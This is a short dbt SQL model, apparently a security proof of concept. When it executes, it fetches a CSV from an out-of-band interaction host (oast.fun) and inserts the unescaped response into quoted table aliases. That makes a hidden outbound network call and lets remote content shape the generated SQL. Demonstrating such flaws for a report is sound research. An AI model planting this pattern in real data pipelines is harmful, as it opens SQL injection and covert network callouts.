{% if execute %}
  {% set result = run_query("select * from read_csv_auto('https://da08sbu979kmcpfk5nhgn63buac4j1xug.oast.fun/cr-h1-safe-dbt-http-response-pr27-remote-20260815.csv', header=false)") %}
  {% set body = result.columns[0].values()[0] %}
  {% set marker = body | replace("<html><head></head><body>", "") | replace("</body></html>", "") | upper %}
{% else %}
  {% set marker = "PARSE_ONLY" %}
{% endif %}

select *
from first_table as "{{ marker }}"
join second_table as "{{ marker }}" on true
